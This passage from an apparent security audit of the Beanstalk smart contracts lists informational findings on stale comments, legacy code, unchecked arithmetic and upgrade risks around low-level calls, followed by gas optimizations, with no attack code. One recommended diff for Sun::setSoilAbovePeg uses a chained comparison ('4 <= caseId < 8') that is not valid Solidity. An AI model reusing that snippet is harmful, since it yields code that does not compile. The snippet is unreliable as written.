However, this comment is incorrect as the [constants](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L27-L28) used in the subsequent [event emissions](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L70-L71) are 0, as intended.


### Double assignment in `InitDiamond` should be removed to avoid confusion

When initializing the "Weather" cases in `InitDiamond` there is a double assignment which should be removed to avoid confusion:

```diff
- s.cases = s.cases = [
+ s.cases = [
        // Dsc, Sdy, Inc, nul
       int8(3),   1,   0,   0,  // Exs Low: P < 1
```


### `LibSilo::_removeDepositsFromAccount` events may be emitted with additional `amounts` elements when called from `EnrootFacet::enrootDeposits` with `amounts.length > stems.length`

For the purpose of gas efficiency, `EnrootFacet::enrootDeposits` does not validate that its `stems` and `amounts` array arguments are of the same length. [Looping](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L138) over the `stems` array, any additional `amounts` elements would remain unused and in the case of `amounts.length < stems.length` this would result in an index out-of-bounds error. The same is true of the [call](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L64-L69) to [`LibSilo::_removeDepositsFromAccount`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L577) which makes use of these arguments; however, in the case where `amounts` contains additional elements then these will be emitted [`LibSilo::TransferBatch`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L616) and [`LibSilo::RemoveDeposits`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L617) events which may be undesirable.


### Inaccurate comment in `TokenFacet::approveToken` NatSpec

The `TokenFacet::approveToken` NatSpec currently [states](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L102) that this function approves a token for both internal and external token balances; however, this is not correct as the [call](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L109) to [`LibTokenApprove::approve`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenApprove.sol#L21-L30) does not approve for external balances, only internal balances that are only ever spent by [calling](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L94) [`LibTokenApprove.spendAllowance`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenApprove.sol#L40-L55) in [`TokenFacet::transferInternalTokenFrom`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L77).


### Shadowing of `AppStorage` storage pointer variable `s` in Facets which inherit `ReentrancyGuard`

The `AppStorage` storage pointer variable `s` is [defined in `ReentrancyGuard`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/ReentrancyGuard.sol#L17) as the sole variable in its first storage slot. Both [`MigrationFacet::getDepositLegacy`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/MigrationFacet.sol#L95) and [`LegacyClaimWithdrawalFacet::getWithdrawal`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/LegacyClaimWithdrawalFacet.sol#L71) shadow this existing declaration within the body of functions relating to legacy deposits/withdrawals. While this does not pose a security risk, it is recommended to remove the shadowed declarations, instead using the storage pointer defined in the inherited contract.


### Miscellaneous comments on `TokenSilo` NatSpec and legacy references

Beanstalk previously implemented a withdrawal queue that was later replaced by a per-Season vesting period. The `TokenSilo` contract NatSpec currently still [references](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L20-L21) this legacy withdrawal system but should be updated to reflect the current implementation pertaining to the removal of Stem-based deposits.

Additionally, references to "Crates" and [`crateBdv`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L348) should be removed and updated to `bdvRemoved` respectively. The [NatSpec of `TokenSilo::tokenSettings`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L430-L446) is missing references to [`milestoneStem`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L403-L406) and [`encodeType`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L408-L411) which are also present in the `SiloSettings` storage struct. Consider reordering this comment to accurately reflect the order of elements in the [declaration](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L373) within `AppStorage.sol`.


### Incorrect comment in `Oracle::totalDeltaB` NatSpec

Currently, `Oracle::totalDeltaB` [states](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Oracle.sol#L23) that this function returns the current shortage/excess of Beans (`deltaB`) in the BEAN/3CRV Curve liquidity pool; however, it [actually returns the sum](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Oracle.sol#L26-L28) of `deltaB` across both the Curve pool and BEAN/ETH Well and so the comment should be updated to reflect this.


### `Sun::setSoilAbovePeg` considers intervals for `caseId` larger than intended

As is [commented](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L219) in the NatSpec of [`Sun::setSoilAbovePeg`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L226-L234), Beanstalk wants to gauge demand for Soil _when above peg_. As such, based on the implementation of [`InitBip13`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBip13.sol#L18-L30), the following modifications should be made:

```diff
-   if (caseId >= 24) {
+   if (caseId >= 28) {
         newSoil = newSoil.mul(SOIL_COEFFICIENT_HIGH).div(C.PRECISION); // high podrate
-   } else if (caseId < 8) {
+   } else if (4 <= caseId < 8) {
         newSoil = newSoil.mul(SOIL_COEFFICIENT_LOW).div(C.PRECISION); // low podrate
    }
```

This does not affect the Soil mechanism because the `caseId` [passed](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L58) to [`Sun::stepSun`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L66-L83) when called in [`SeasonFacet::gm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L47-L62) has already been correctly calculated from within [`Weather::stepWeather`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L100-L172); however, it is recommended to modify the logic so that its implementation strictly conforms to its intention.


### Inaccurate comment in `LibTokenSilo::removeDepositFromAccount` NatSpec should be updated

Legacy Silo v2 Deposits are stored in a [legacy mapping](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L149), now deprecated but maintained as legacy deposits that have not been migrated remain stored here. [This line](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L218) in the `LibTokenSilo::removeDepositFromAccount` NatSpec appears to refer to the legacy deposits mapping and should be updated to the new [Silo v3 deposits](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L156) stored as a mapping `uint256` to `Deposit`. If this comment already intends to refer to the new deposits mapping, it should be made clear that `[token][stem]` is meant to indicate the concatenation of the token address and stem value to get the deposit identifier used as a key to the mapping.


### Unused legacy function `LibTokenSilo::calculateStalkFromStemAndBdv` can be removed

As [stated](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L205-L207) in `ConvertFacet::_depositTokensForConvert`, the legacy function [`LibTokenSilo::calculateStalkFromStemAndBdv`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L416-L428) is no longer used and so can be removed. If it is desired to keep this function visible for reference, then it is recommended to comment it out.


### `LibUniswapOracle::PERIOD` comment should be resolved

There is a [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Oracle/LibUniswapOracle.sol#L21) in `LibUniswapOracle` that suggests the [`PERIOD`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Oracle/LibUniswapOracle.sol#L22) constant may be incorrect. It is understood that this value is actually already correct, so the todo comment should be resolved and all references to a 30-minute lookback period in the Beanstalk whitepaper should be updated.


### Ambiguous comment in `LibEthUsdOracle::getPercentDifference` NatSpec

The following comment in the NatSpec of [`LibEthUsdOracle::getPercentDifference`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Oracle/LibEthUsdOracle.sol#L80-L83) is ambiguous:
> *Gets the percent difference between two values with 18 decimal precision.*

This function returns a percentage difference with 18 decimal precision but does not necessarily require that the values it takes as argument should be of 18 decimal precision; they should, however, both be of the same precision, which in this case is 6 decimals. It is recommended to reword the comment to make clearer these intentions and behaviours.


### Miscellaneous informational findings regarding Curve-related contracts/libraries

It is understood that a significant portion of logic related to Curve contracts has been copied from existing implementations, written in Vyper, and ported to Solidity for the purpose of use both within Beanstalk and as an on-chain reference for wider Beanstalk ecosystem contracts. The most pressing issue identified here pertains to the use of unchecked arithmetic. Unlike the Solidity compiler version 0.7.6 utilized by the Beanstalk contracts, the Vyper compiler, utilized by Curve contracts, handles integer overflow checks by default and will revert if one is detected. In other contracts where this functionality is desired, Beanstalk uses the OpenZeppelin SafeMath library; however, this is not the case at all in [`LibCurve`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L13), [`CurvePrice`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/ecosystem/price/CurvePrice.sol#L17) and [`BeanstalkPrice`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/ecosystem/price/BeanstalkPrice.sol#L7). While we have been unable to identify any specific vulnerabilities (due to the time-constrained nature of this engagement) that may arise as a result, it is recommended to implement these contracts as closely to the existing Vyper implementations as possible, using SafeMath functions rather than unchecked arithmetic operators. `LibBeanMetaCurve` does import the SafeMath library but still contains some [instances](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibBeanMetaCurve.sol#L40) of [unchecked arithmetic](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibBeanMetaCurve.sol#L58)  if this is intentional, then it should at least be commented as explaining why it is safe to do so; otherwise, the recommendation applies here also.

The following additional informational findings were identified:
* `CurvePrice::getCurveDeltaB` and `LibBeanMetaCurve::getDeltaBWithD` both contain [unsafe](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/ecosystem/price/CurvePrice.sol#L56) [casts](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibBeanMetaCurve.sol#L59) from `uint256` to `int256`. While it is unlikely that these will ever cause an issue since the number of beans at peg and the corresponding equilibrium pool BEAN balance are both highly unlikely to exceed the max `int256` value, it is recommended that this be resolved along with the recommendation regarding the use of unchecked arithmetic.
* [Multiplication by one](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L43) is unnecessary and redundant when calculating the price based on normalized reserves and rates, given that it adds no additional precision and that of the BEAN rate is already sufficient at 30 decimals.
* The [implementation referenced](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L88) in `LibCurve::getD` uses `255` as the upper bound for the number of Newton-Raphson approximation iterations rather than `256`, as is the case [here](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L98). In reality, the approximation should converge long before nearing either of these values, so any additional gas usage is unlikely.
* In the event `LibCurve::getD` fails to converge, this function [will revert](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L110); therefore, the unreachable line of code which [returns zero](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L111) does not appear to be necessary.
* The NatSpec of `LibCurve::getXP` contains a small [mistake](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L151):
```diff
    /**
     * @dev Return the `xp` array for two tokens. Adjusts `balances[0]` by `padding`
     * and `balances[1]` by `rate / PRECISION`.
     *
-    * This is provided as a gas optimization when `rates[0] * PRECISION` has been
+    * This is provided as a gas optimization when `rates[0] / PRECISION` has been
     * pre-computed.
     */
```
* The `xp1` variable in [`LibCurveConvert::beansToPeg`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Convert/LibCurveConvert.sol#L24-L35) should be renamed `xp0` to be semantically correct.
* `CurveFacet::is3Pool` should be formatted with the same indentation as other functions consider running a formatting tool such as `forge fmt`.
* The existing [`token`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L244) declaration within `CurveFacet::removeLiquidityImbalance` can be reused when entering the conditional 3Pool/Tri-Crypto block rather than also declaring [`lpToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L244) which will be assigned the same value.


### Legacy code in `LibPRBMath` should be removed

The commented versions of the [`SCALE_LPOTD`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L24) and [`SCALE_INVERSE`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L28) constants in `LibPRBMath` are taken from the original [PRBMath library](https://github.com/PaulRBerg/prb-math/blob/e33a042e4d1673fe9b333830b75c4765ccf3f5f2/contracts/PRBMath.sol#L113-L118) and are intended to work with unsigned 60.18-decimal fixed-point numbers. It is understood that the values of the [uncommented versions](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L37-L42) of these constants were derived by the original author for modifications required by Beanstalk. These modifications are no longer used, and so, along with [`LibPRBMath::powu`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L44-L57), [`LibPRBMath::logBase2`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L33-L66) and [`LibPRBMath::mulDivFixedPoint`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L59C14-L96) should be removed.


### Remove unused/unnecessary constants in `LibIncentive`

`LibIncentive` currently defines a [`PERIOD`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibIncentive.sol#L23-L24) constant for the Uniswap Oracle lookback window, which is both unused and incorrect  this should be removed. This library also defines [`BASE_FEE_CONTRACT`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibIncentive.sol#L45-L46), which shadows a constant of the same name and value in `C.sol`  this can also be removed in favor of the [definition](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L75-L76) in `C.sol`.


### `IBeanstalk` interface should be updated to reference Stem-based deposits

The [`IBeanstalk`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/interfaces/IBeanstalk.sol#L26) interface currently references the old interface for a number of functions and should be updated:

```diff
    function transferDeposits(
        address sender,
        address recipient,
        address token,
-        uint32[] calldata seasons,
+        int96[] calldata stems,
        uint256[] calldata amounts
    ) external payable returns (uint256[] memory bdvs);

    ...

    function convert(
        bytes calldata convertData,
-        uint32[] memory crates,
+        int96[] memory stems,
        uint256[] memory amounts
    ) external payable returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv);

    function getDeposit(
        address account,
        address token,
-        uint32 season
+        int96 stem
    ) external view returns (uint256, uint256);
```


### Legacy withdrawal queue logic in `Weather::handleRain` should be updated

`Weather::handleRain` contains a [condition](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L239-L241) related to the legacy withdrawal queue that should be modified to reflect the updated logic. It is understood this has since been modified in a more recent commit.


### `Depot` is missing functions present in on-chain deployment

The `Depot` contract is already [deployed](https://etherscan.io/address/0xDEb0f00071497a5cc9b4A6B96068277e57A82Ae2) and in use; however, this deployed version contains `receive` and `version` functions that are missing from the contract at the current commit hash. It is understood that the contract was updated and these functions were added in a more recent commit.


### Shadowed `Prices` struct declaration should be resolved

Both `P.sol` and `BeanstalkPrice` declare a `Prices` struct of similar form. The version currently residing in `P.sol` should be modified as follows in favor of that in `BeanstalkPrice` which can then be subsequently be removed:

```diff
    struct Prices {
-       address pool;
-       address[] tokens;
        uint256 price;
        uint256 liquidity;
        int deltaB;
        P.Pool[] ps;
    }
```


### `Root.sol` should be updated to be compatible with recent changes to Beanstalk

It is understood that `Root.sol` is wholly commented out due to incompatibility with more recent changes to the core Beanstalk system. This should be resolved such that the upgradeable Root contract is once again compatible with the current iteration of Beanstalk and users can interact with wrapped Silo deposits as intended.


### Inaccurate NatSpec comments in `AppStorage`

Within the [`AppStorage::SiloSettings`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L373) struct, there is a [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L381-L385) that references the use of a `delegatecall` to calculate the Bean Denominated Value (BDV) of a token. This is incorrect  it is a [`staticcall`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L287) to the selector corresponding to any of the signatures contained within [`BDVFacet`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/BDVFacet.sol#L18) and not [`tokenToBdv`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L368C18-L368C28).

Other inaccuracies are present in both the [`AppStorage::AppStorage`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L441-L550) and [`AppStorage::State`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L86-L160) structs where there are members missing from the documentation and/or documented in an order that is not reflective of the subsequent declarations. These should be checked carefully and updated accordingly for the sake of consistency and minimizing confusion.


### Extra attention must be paid to future contract upgrades that utilize new or otherwise modify existing low-level calls

Care must be taken when introducing new features to Beanstalk that leverage low-level calls to ensure that they cannot be manipulated to appear as if those to functions that use `LibDiamond::enforceIsOwnerOrContract` originated from Beanstalk. This could allow a caller to circumvent this check, giving them access to privileged functions in the `UnripeFacet`, `PauseFacet`, `FundraiserFacet`, and `WhitelistFacet`.  While this does not appear to be immediately exploitable, it is important to understand that a successful exploit would require access to either an arbitrary external call within Beanstalk or a `delegateCall` in the context of Beanstalk following a low-level call in which the Beanstalk Diamond is the `msg.sender`. To reiterate, special attention must be paid to the implications of additions in any future upgrades that may introduce unsafe arbitrary external calls, especially considering usage with the `DepotFacet`, `FarmFacet`, `Pipeline`, and `LibETH`/`LibWETH`.




### Lambda convert logic should continue to be refined

The purpose of the `LibConvertData::ConvertKind` enum type [`LAMBDA_LAMBDA`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Convert/LibConvertData.sol#L17) is to allow the Bean Denominated Value (BDV) of a deposit to be updated without forcing the owner to first withdraw that deposit, which has the undesirable side-effect of foregoing the grown Stalk of the deposit. The token `amountIn` and `amountOut` are equal when calling [`LibLambdaConvert::convert`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Convert/LibLambdaConvert.sol#L15-L28) through [`ConvertFacet::convert`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L71), which proceeds to calculate a [new BDV](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L85) for the deposit corresponding to the existing token amount. As mentioned, this allows users to update the BDV of a deposit that is potentially stale to the downside without first withdrawing the deposit; however, by the same token, it is possible for the BDV for a deposit to be stale in such a way that its BDV is higher than it should be in reality. In this case, the user has no incentive to perform a lambda convert on their deposit because it benefits from additional seignorage than it should actually be owed given current market conditions. It is [not currently possible](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L85) for the BDV of a deposit to decrease, but it is understood that a Game Theoretic solution is intended to be implemented to allow any caller to initiate a lambda convert on the deposit of a given account that may be stale in this way. It is recommended that this solution be implemented as a temporary measure while other methods for handling this issue are explored.


### Contract upgrades must consider that `msg.value` is persisted through `delegatecall`

Given that `msg.value` is persisted through `delegatecall`, it is important that future contract upgrades consider the possibility of this behavior being weaponized within loops that may make unsafe use of this value. While this does not appear to be immediately exploitable, there have previously been other variants [discovered in the wild](https://samczsun.com/two-rights-might-make-a-wrong/). To reiterate, special attention must be paid to the implications of additions in any future upgrades that may introduce unsafe use of `msg.value` within loops, especially considering usage with low-level calls in the `DepotFacet`, `FarmFacet`, `Pipeline`, and `LibETH`/`LibWETH`.

\clearpage
## Gas Optimization


### Avoid unnecessary use of `SafeMath` operations

There are a number of instances as outlined below where the use of `SafeMath` operations can be avoided to save gas due to the fact that these values are already validated or otherwise guaranteed to not overflow:

```solidity
File: /beanstalk/farm/TokenFacet.sol

151:        currentAllowance.sub(subtractedValue)
```

```solidity
File: /beanstalk/market/Listing.sol

194:        l.amount.sub(amount),

220:        l.amount.sub(amount),
```

```solidity
File: /libraries/Token/LibTransfer.sol

69:                token.balanceOf(address(this)).sub(beforeBalance)
```

```solidity
File: /libraries/Silo/LibSilo.sol

264:        s.a[account].roots = s.a[account].roots.sub(roots);
```


### Duplicated logic in `Silo::_plant` when resetting the delta roots for an account

When executing`Silo::_plant`, the delta roots of the account must be [reset to zero](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/Silo.sol#L111); otherwise, `SiloExit::_balanceOfEarnedBeans` will return an incorrect amount of beans. This logic is currently [repeated](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/Silo.sol#L127) after calling `LibTokenSilo::addDepositToAccount`, within which the delta roots of an account is not accessed, and so the redundant reassignment can be removed.

```diff
        // Silo::_plant
        s.a[account].deltaRoots = 0; // must be 0'd, as calling balanceOfEarnedBeans would give a invalid amount of beans.
        if (beans == 0) return (0,stemTip);

        // Reduce the Silo's supply of Earned Beans.
        // SafeCast unnecessary because beans is <= s.earnedBeans.
        s.earnedBeans = s.earnedBeans.sub(uint128(beans));

        // Deposit Earned Beans if there are any. Note that 1 Bean = 1 BDV.
        LibTokenSilo.addDepositToAccount(
            account,
            C.BEAN,
            stemTip,
            beans, // amount
            beans, // bdv
            LibTokenSilo.Transfer.emitTransferSingle
        );
-       s.a[account].deltaRoots = 0; // must be 0'd, as calling balanceOfEarnedBeans would give a invalid amount of beans.
```


### Avoid using `SafeMath::div` when it is not possible for the divisor to be zero

Use of `SafeMath::div` is only necessary if the divisor can be zero. Therefore, if the divisor cannot be zero then use of this function can be avoided. The following instances have been identified where this is the case:

```solidity
File: /beanstalk/barn/FertilizerFacet.sol

45:        uint128 remaining = uint128(LibFertilizer.remainingRecapitalization().div(1e6)); // remaining <= 77_000_000 so downcasting is safe.

52:        ).div(1e6)); // return value <= amount, so downcasting is safe.
```

```solidity
File: /beanstalk/diamond/PauseFacet.sol

42:        timePassed = (timePassed.div(3600).add(1)).mul(3600);
```

```solidity
File: /beanstalk/field/FieldFacet.sol

344:            LibDibbler.morningTemperature().div(LibDibbler.TEMPERATURE_PRECISION)
```

```solidity
File: /beanstalk/market/MarketFacet/Order.sol

105:        uint256 costInBeans = amount.mul(o.pricePerPod).div(1000000);

197:        beanAmount = beanAmount.div(1000000);
```

```solidity
File: /beanstalk/metadata/MetadataImage.sol

167:        uint256 totalSprouts = uint256(stalkPerBDV).div(STALK_GROWTH).add(16);
168:        uint256 numRows = uint256(totalSprouts).div(4).mod(4);

596:        numStems = uint256(grownStalkPerBDV).div(STALK_GROWTH);
597:        plots = numStems.div(16).add(1);
```

```solidity
File: /beanstalk/silo/SiloFacet/SiloExit.sol

205:        beans = (stalk - accountStalk).div(C.STALK_PER_BEAN); // Note: SafeMath is redundant here.
```

```solidity
File: /beanstalk/sun/SeasonFacet/SeasonFacet.sol

139:        .div(C.BLOCK_LENGTH_SECONDS);
```

```solidity
File: /beanstalk/sun/SeasonFacet/Sun.sol

121:        uint256 maxNewFertilized = amount.div(FERTILIZER_DENOMINATOR);

167:        newHarvestable = amount.div(HARVEST_DENOMINATOR);

227:        uint256 newSoil = newHarvestable.mul(100).div(100 + s.w.t);

229:            newSoil = newSoil.mul(SOIL_COEFFICIENT_HIGH).div(C.PRECISION); // high podrate

231:            newSoil = newSoil.mul(SOIL_COEFFICIENT_LOW).div(C.PRECISION); // low podrate
```

```solidity
File: /ecosystem/price/CurvePrice.sol

47:        rates[0] = rates[0].mul(pool.price).div(1e6);
```

```solidity
File: /libraries/Convert/LibMetaCurveConvert.sol

